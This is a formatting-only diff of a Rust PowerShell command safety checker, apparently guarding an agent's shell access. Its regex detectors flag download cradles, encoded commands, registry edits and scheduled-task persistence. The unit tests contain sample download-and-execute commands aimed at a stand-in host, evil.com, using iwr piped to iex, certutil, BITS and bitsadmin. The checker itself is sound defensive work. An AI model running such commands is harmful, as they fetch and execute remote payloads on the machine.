@@ -95,9 +95,8 @@ pub fn powershell_command_is_safe(command: &str) -> PowerShellSecurityResult {
 /// Checks for Invoke-Expression or its alias (iex).
 /// These are equivalent to eval and can execute arbitrary code.
 fn check_invoke_expression(command: &str) -> PowerShellSecurityResult {
-    static RE: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"(?i)\b(Invoke-Expression|iex)\b").expect("valid regex")
-    });
+    static RE: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"(?i)\b(Invoke-Expression|iex)\b").expect("valid regex"));
     if RE.is_match(command) {
         return PowerShellSecurityResult::Ask(
             "Command uses Invoke-Expression which can execute arbitrary code".to_owned(),
@@ -111,9 +110,8 @@ fn check_invoke_expression(command: &str) -> PowerShellSecurityResult {
 /// common patterns: `& $cmd`, `& $(...)`, variable-based command invocation.
 fn check_dynamic_command_name(command: &str) -> PowerShellSecurityResult {
     // Call operator with variable/expression: & $cmd ... or & $(...) ...
-    static RE: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"(?i)&\s*(\$\w+|\$\()").expect("valid regex")
-    });
+    static RE: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"(?i)&\s*(\$\w+|\$\()").expect("valid regex"));
     if RE.is_match(command) {
         return PowerShellSecurityResult::Ask(
             "Command name is a dynamic expression which cannot be statically validated".to_owned(),
@@ -141,11 +139,11 @@ fn check_download_cradles(command: &str) -> PowerShellSecurityResult {
 
     // Split cradle: $r = IWR ...; IEX $r.Content
     static SPLIT_DOWNLOADER: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"(?i)\b(Invoke-WebRequest|iwr|Invoke-RestMethod|irm|Start-BitsTransfer)\b").expect("valid regex")
+        Regex::new(r"(?i)\b(Invoke-WebRequest|iwr|Invoke-RestMethod|irm|Start-BitsTransfer)\b")
+            .expect("valid regex")
     });
-    static SPLIT_IEX: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"(?i)\b(Invoke-Expression|iex)\b").expect("valid regex")
-    });
+    static SPLIT_IEX: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"(?i)\b(Invoke-Expression|iex)\b").expect("valid regex"));
     if SPLIT_DOWNLOADER.is_match(command) && SPLIT_IEX.is_match(command) {
         return PowerShellSecurityResult::Ask(
             "Command downloads and executes remote code".to_owned(),
@@ -164,9 +162,8 @@ fn check_download_cradles(command: &str) -> PowerShellSecurityResult {
 /// - `bitsadmin /transfer`: legacy BITS download.
 fn check_download_utilities(command: &str) -> PowerShellSecurityResult {
     // Start-BitsTransfer is purpose-built for file transfer
-    static BITS: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"(?i)\bStart-BitsTransfer\b").expect("valid regex")
-    });
+    static BITS: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"(?i)\bStart-BitsTransfer\b").expect("valid regex"));
     if BITS.is_match(command) {
         return PowerShellSecurityResult::Ask(
             "Command downloads files via BITS transfer".to_owned(),
@@ -174,9 +171,8 @@ fn check_download_utilities(command: &str) -> PowerShellSecurityResult {
     }
 
     // certutil -urlcache or /urlcache
-    static CERTUTIL: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"(?i)\bcertutil(\.exe)?\b.*[-/]urlcache\b").expect("valid regex")
-    });
+    static CERTUTIL: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"(?i)\bcertutil(\.exe)?\b.*[-/]urlcache\b").expect("valid regex"));
     if CERTUTIL.is_match(command) {
         return PowerShellSecurityResult::Ask(
             "Command uses certutil to download from a URL".to_owned(),
@@ -203,7 +199,8 @@ fn check_download_utilities(command: &str) -> PowerShellSecurityResult {
 /// Checks for encoded command parameters which obscure intent.
 fn check_encoded_command(command: &str) -> PowerShellSecurityResult {
     static RE: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"(?i)\b(pwsh|powershell)(\.exe)?\b.*[-/](e(ncodedcommand)?|enc|ec)\b").expect("valid regex")
+        Regex::new(r"(?i)\b(pwsh|powershell)(\.exe)?\b.*[-/](e(ncodedcommand)?|enc|ec)\b")
+            .expect("valid regex")
     });
     if RE.is_match(command) {
         return PowerShellSecurityResult::Ask(
@@ -243,13 +240,9 @@ fn check_nested_powershell(command: &str) -> PowerShellSecurityResult {
 
 /// Checks for Add-Type usage which compiles and loads .NET code at runtime.
 fn check_add_type(command: &str) -> PowerShellSecurityResult {
-    static RE: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"(?i)\bAdd-Type\b").expect("valid regex")
-    });
+    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)\bAdd-Type\b").expect("valid regex"));
     if RE.is_match(command) {
-        return PowerShellSecurityResult::Ask(
-            "Command compiles and loads .NET code".to_owned(),
-        );
+        return PowerShellSecurityResult::Ask("Command compiles and loads .NET code".to_owned());
     }
     PowerShellSecurityResult::Passthrough
 }
@@ -257,18 +250,16 @@ fn check_add_type(command: &str) -> PowerShellSecurityResult {
 /// Checks for New-Object -ComObject. COM objects like WScript.Shell,
 /// Shell.Application have their own execution/download capabilities.
 fn check_com_object(command: &str) -> PowerShellSecurityResult {
-    static RE: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"(?i)\bNew-Object\b.*[-/]com(object)?\b").expect("valid regex")
-    });
+    static RE: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"(?i)\bNew-Object\b.*[-/]com(object)?\b").expect("valid regex"));
     if RE.is_match(command) {
         return PowerShellSecurityResult::Ask(
             "Command instantiates a COM object which may have execution capabilities".to_owned(),
         );
     }
     // Also check positional: New-Object -Com "WScript.Shell"
-    static RE_COM_VALUE: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"(?i)\bNew-Object\b.*\bCOM\b").expect("valid regex")
-    });
+    static RE_COM_VALUE: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"(?i)\bNew-Object\b.*\bCOM\b").expect("valid regex"));
     if RE_COM_VALUE.is_match(command) {
         return PowerShellSecurityResult::Ask(
             "Command instantiates a COM object which may have execution capabilities".to_owned(),
@@ -303,24 +294,18 @@ fn check_type_literals(command: &str) -> PowerShellSecurityResult {
 /// Detects `.Method()` and `::Method()` patterns.
 fn check_member_invocations(command: &str) -> PowerShellSecurityResult {
     // Static method invocation: [Type]::Method(...)
-    static RE_STATIC: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"\[.*\]::\s*\w+\s*\(").expect("valid regex")
-    });
+    static RE_STATIC: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"\[.*\]::\s*\w+\s*\(").expect("valid regex"));
     if RE_STATIC.is_match(command) {
-        return PowerShellSecurityResult::Ask(
-            "Command invokes .NET static methods".to_owned(),
-        );
+        return PowerShellSecurityResult::Ask("Command invokes .NET static methods".to_owned());
     }
 
     // Instance method invocation: $var.Method() or .Method()
     // Exclude common safe property access patterns like .Length, .Count
-    static RE_INSTANCE: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"(\$\w+|\))\.\w+\s*\(").expect("valid regex")
-    });
+    static RE_INSTANCE: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"(\$\w+|\))\.\w+\s*\(").expect("valid regex"));
     if RE_INSTANCE.is_match(command) {
-        return PowerShellSecurityResult::Ask(
-            "Command invokes .NET methods".to_owned(),
-        );
+        return PowerShellSecurityResult::Ask("Command invokes .NET methods".to_owned());
     }
 
     PowerShellSecurityResult::Passthrough
@@ -347,12 +332,10 @@ fn check_dangerous_file_path_execution(command: &str) -> PowerShellSecurityResul
     for cmdlet in FILEPATH_EXECUTION_CMDLETS {
         if lower.contains(cmdlet) {
             // Check for -FilePath or -f parameter
-            static RE_FILEPATH: Lazy<Regex> = Lazy::new(|| {
-                Regex::new(r"(?i)[-/]f(ilepath)?\s+\S").expect("valid regex")
-            });
-            static RE_LITERALPATH: Lazy<Regex> = Lazy::new(|| {
-                Regex::new(r"(?i)[-/]l(iteralpath)?\s+\S").expect("valid regex")
-            });
+            static RE_FILEPATH: Lazy<Regex> =
+                Lazy::new(|| Regex::new(r"(?i)[-/]f(ilepath)?\s+\S").expect("valid regex"));
+            static RE_LITERALPATH: Lazy<Regex> =
+                Lazy::new(|| Regex::new(r"(?i)[-/]l(iteralpath)?\s+\S").expect("valid regex"));
             if RE_FILEPATH.is_match(command) || RE_LITERALPATH.is_match(command) {
                 return PowerShellSecurityResult::Ask(
                     "Command -FilePath executes an arbitrary script file".to_owned(),
@@ -393,17 +376,17 @@ fn check_for_each_member_name(command: &str) -> PowerShellSecurityResult {
 fn check_start_process_elevation(command: &str) -> PowerShellSecurityResult {
     // -Verb RunAs
     static RE_RUNAS: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r#"(?i)\b(Start-Process|saps|start)\b.*[-/]v(erb)?:?\s*['"]?runas['"]?"#).expect("valid regex")
+        Regex::new(r#"(?i)\b(Start-Process|saps|start)\b.*[-/]v(erb)?:?\s*['"]?runas['"]?"#)
+            .expect("valid regex")
     });
     if RE_RUNAS.is_match(command) {
-        return PowerShellSecurityResult::Ask(
-            "Command requests elevated privileges".to_owned(),
-        );
+        return PowerShellSecurityResult::Ask("Command requests elevated privileges".to_owned());
     }
 
     // Start-Process targeting PowerShell executable
     static RE_PS_TARGET: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"(?i)\b(Start-Process|saps)\b.*\b(pwsh|powershell)(\.exe)?\b").expect("valid regex")
+        Regex::new(r"(?i)\b(Start-Process|saps)\b.*\b(pwsh|powershell)(\.exe)?\b")
+            .expect("valid regex")
     });
     if RE_PS_TARGET.is_match(command) {
         return PowerShellSecurityResult::Ask(
@@ -439,13 +422,9 @@ fn check_dangerous_script_block_cmdlets(command: &str) -> PowerShellSecurityResu
 
 /// Checks for subexpressions $() which can hide command execution.
 fn check_sub_expressions(command: &str) -> PowerShellSecurityResult {
-    static RE: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"\$\(").expect("valid regex")
-    });
+    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"\$\(").expect("valid regex"));
     if RE.is_match(command) {
-        return PowerShellSecurityResult::Ask(
-            "Command contains subexpressions $()".to_owned(),
-        );
+        return PowerShellSecurityResult::Ask("Command contains subexpressions $()".to_owned());
     }
     PowerShellSecurityResult::Passthrough
 }
@@ -455,9 +434,7 @@ fn check_sub_expressions(command: &str) -> PowerShellSecurityResult {
 /// execution or variable interpolation inside string literals.
 fn check_expandable_strings(command: &str) -> PowerShellSecurityResult {
     // Look for double-quoted strings containing $ (variable expansion)
-    static RE: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r#""[^"]*\$[^"]*""#).expect("valid regex")
-    });
+    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r#""[^"]*\$[^"]*""#).expect("valid regex"));
     if RE.is_match(command) {
         return PowerShellSecurityResult::Ask(
             "Command contains expandable strings with embedded expressions".to_owned(),
@@ -494,9 +471,8 @@ const ENV_WRITE_CMDLETS: &[&str] = &[
 /// env: scope, or direct assignment to $env: variables.
 fn check_env_var_manipulation(command: &str) -> PowerShellSecurityResult {
     // Check for $env: or env: scope references combined with write cmdlets
-    static RE_ENV: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"(?i)(\$env:|env:\w)").expect("valid regex")
-    });
+    static RE_ENV: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"(?i)(\$env:|env:\w)").expect("valid regex"));
     if !RE_ENV.is_match(command) {
         return PowerShellSecurityResult::Passthrough;
     }
@@ -516,13 +492,10 @@ fn check_env_var_manipulation(command: &str) -> PowerShellSecurityResult {
     }
 
     // Direct assignment: $env:FOO = "bar"
-    static RE_ASSIGN: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"(?i)\$env:\w+\s*=").expect("valid regex")
-    });
+    static RE_ASSIGN: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"(?i)\$env:\w+\s*=").expect("valid regex"));
     if RE_ASSIGN.is_match(command) {
-        return PowerShellSecurityResult::Ask(
-            "Command modifies environment variables".to_owned(),
-        );
+        return PowerShellSecurityResult::Ask("Command modifies environment variables".to_owned());
     }
 
     PowerShellSecurityResult::Passthrough
@@ -565,15 +538,11 @@ fn check_registry_manipulation(command: &str) -> PowerShellSecurityResult {
 
     // Set-Item / New-Item on registry paths
     static RE_SET: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(
-            r"(?i)\b(Set-Item|si|New-Item|ni)\b.*(HKLM:|HKCU:|Registry::)",
-        )
-        .expect("valid regex")
+        Regex::new(r"(?i)\b(Set-Item|si|New-Item|ni)\b.*(HKLM:|HKCU:|Registry::)")
+            .expect("valid regex")
     });
     if RE_SET.is_match(command) {
-        return PowerShellSecurityResult::Ask(
-            "Command modifies the Windows registry".to_owned(),
-        );
+        return PowerShellSecurityResult::Ask("Command modifies the Windows registry".to_owned());
     }
 
     PowerShellSecurityResult::Passthrough
@@ -589,9 +558,7 @@ fn check_service_manipulation(command: &str) -> PowerShellSecurityResult {
         Regex::new(r"(?i)\b(Stop-Service|spsv|Remove-Service|Set-Service|Restart-Service|Start-Service|sasv|Suspend-Service|Resume-Service)\b").expect("valid regex")
     });
     if RE.is_match(command) {
-        return PowerShellSecurityResult::Ask(
-            "Command manipulates Windows services".to_owned(),
-        );
+        return PowerShellSecurityResult::Ask("Command manipulates Windows services".to_owned());
     }
     PowerShellSecurityResult::Passthrough
 }
@@ -602,9 +569,8 @@ fn check_service_manipulation(command: &str) -> PowerShellSecurityResult {
 
 /// Checks for Invoke-Item (alias ii) which opens files with default handlers.
 fn check_invoke_item(command: &str) -> PowerShellSecurityResult {
-    static RE: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"(?i)\b(Invoke-Item|ii)\b").expect("valid regex")
-    });
+    static RE: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"(?i)\b(Invoke-Item|ii)\b").expect("valid regex"));
     if RE.is_match(command) {
         return PowerShellSecurityResult::Ask(
             "Invoke-Item opens files with the default handler (ShellExecute). On executable files this runs arbitrary code.".to_owned(),
@@ -634,7 +600,8 @@ fn check_scheduled_task(command: &str) -> PowerShellSecurityResult {
     });
     if RE_SCHTASKS.is_match(command) {
         return PowerShellSecurityResult::Ask(
-            "schtasks with create/change modifies scheduled tasks (persistence primitive)".to_owned(),
+            "schtasks with create/change modifies scheduled tasks (persistence primitive)"
+                .to_owned(),
         );
     }
 
@@ -664,9 +631,7 @@ fn check_wmi_process_spawn(command: &str) -> PowerShellSecurityResult {
 
 /// Checks for stop-parsing token (--%) which prevents further analysis.
 fn check_stop_parsing_token(command: &str) -> PowerShellSecurityResult {
-    static RE: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"--%").expect("valid regex")
-    });
+    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"--%").expect("valid regex"));
     if RE.is_match(command) {
         return PowerShellSecurityResult::Ask(
             "Command uses stop-parsing token (--%) which prevents security analysis".to_owned(),
@@ -677,14 +642,11 @@ fn check_stop_parsing_token(command: &str) -> PowerShellSecurityResult {
 
 /// Checks for splatting (@variable) which can obscure arguments.
 fn check_splatting(command: &str) -> PowerShellSecurityResult {
-    static RE: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"@\w+").expect("valid regex")
-    });
+    static RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"@\w+").expect("valid regex"));
     if RE.is_match(command) {
         // Distinguish from here-strings @' and @" which are legitimate
-        static RE_SPLAT: Lazy<Regex> = Lazy::new(|| {
-            Regex::new(r"@[a-zA-Z_]\w*").expect("valid regex")
-        });
+        static RE_SPLAT: Lazy<Regex> =
+            Lazy::new(|| Regex::new(r"@[a-zA-Z_]\w*").expect("valid regex"));
         if RE_SPLAT.is_match(command) {
             return PowerShellSecurityResult::Ask(
                 "Command uses splatting (@variable) which can obscure arguments".to_owned(),
@@ -701,7 +663,8 @@ fn check_splatting(command: &str) -> PowerShellSecurityResult {
 /// Checks for runtime state manipulation (alias/variable creation).
 fn check_runtime_state_manipulation(command: &str) -> PowerShellSecurityResult {
     static RE: Lazy<Regex> = Lazy::new(|| {
-        Regex::new(r"(?i)\b(Set-Alias|sal|New-Alias|nal|Set-Variable|sv|New-Variable|nv)\b").expect("valid regex")
+        Regex::new(r"(?i)\b(Set-Alias|sal|New-Alias|nal|Set-Variable|sv|New-Variable|nv)\b")
+            .expect("valid regex")
     });
     if RE.is_match(command) {
         return PowerShellSecurityResult::Ask(
@@ -930,7 +893,8 @@ mod tests {
 
     #[test]
     fn test_download_cradle_piped() {
-        let result = powershell_command_is_safe("Invoke-WebRequest http://evil.com/payload.ps1 | iex");
+        let result =
+            powershell_command_is_safe("Invoke-WebRequest http://evil.com/payload.ps1 | iex");
         assert!(is_ask(&result));
         let result = powershell_command_is_safe("iwr http://example.com | Invoke-Expression");
         assert!(is_ask(&result));
@@ -938,27 +902,32 @@ mod tests {
 
     #[test]
     fn test_download_cradle_split() {
-        let result = powershell_command_is_safe("$r = Invoke-WebRequest http://example.com; iex $r.Content");
+        let result =
+            powershell_command_is_safe("$r = Invoke-WebRequest http://example.com; iex $r.Content");
         assert!(is_ask(&result));
     }
 
     #[test]
     fn test_download_utilities_bits() {
-        let result = powershell_command_is_safe("Start-BitsTransfer -Source http://evil.com/payload.exe");
+        let result =
+            powershell_command_is_safe("Start-BitsTransfer -Source http://evil.com/payload.exe");
         assert!(is_ask(&result));
         assert!(ask_message(&result).unwrap().contains("BITS"));
     }
 
     #[test]
     fn test_download_utilities_certutil() {
-        let result = powershell_command_is_safe("certutil -urlcache -split -f http://evil.com/payload.exe");
+        let result =
+            powershell_command_is_safe("certutil -urlcache -split -f http://evil.com/payload.exe");
         assert!(is_ask(&result));
         assert!(ask_message(&result).unwrap().contains("certutil"));
     }
 
     #[test]
     fn test_download_utilities_bitsadmin() {
-        let result = powershell_command_is_safe("bitsadmin /transfer myjob /download /priority high http://evil.com/payload.exe C:\\payload.exe");
+        let result = powershell_command_is_safe(
+            "bitsadmin /transfer myjob /download /priority high http://evil.com/payload.exe C:\\payload.exe",
+        );
         assert!(is_ask(&result));
         assert!(ask_message(&result).unwrap().contains("BITS"));
     }
@@ -967,7 +936,8 @@ mod tests {
 
     #[test]
     fn test_encoded_command_detected() {
-        let result = powershell_command_is_safe("powershell -encodedcommand JABQAHIAbwBjAGUAcwBzAA==");
+        let result =
+            powershell_command_is_safe("powershell -encodedcommand JABQAHIAbwBjAGUAcwBzAA==");
         assert!(is_ask(&result));
         let result = powershell_command_is_safe("pwsh -e JABQAHIAbwBjAGUAcwBzAA==");
         assert!(is_ask(&result));
@@ -1002,7 +972,11 @@ mod tests {
         // Reflection.Assembly is NOT in CLM allowlist
         let result = powershell_command_is_safe("[Reflection.Assembly]::Load('foo')");
         assert!(is_ask(&result));
-        assert!(ask_message(&result).unwrap().contains("ConstrainedLanguage"));
+        assert!(
+            ask_message(&result)
+                .unwrap()
+                .contains("ConstrainedLanguage")
+        );
     }
 
     #[test]
@@ -1185,9 +1159,13 @@ mod tests {
 
     #[test]
     fn test_wmi_process_spawn_detected() {
-        let result = powershell_command_is_safe("Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe'");
+        let result = powershell_command_is_safe(
+            "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe'",
+        );
         assert!(is_ask(&result));
-        let result = powershell_command_is_safe("Invoke-CimMethod -ClassName Win32_Process -MethodName Create");
+        let result = powershell_command_is_safe(
+            "Invoke-CimMethod -ClassName Win32_Process -MethodName Create",
+        );
         assert!(is_ask(&result));
     }
 
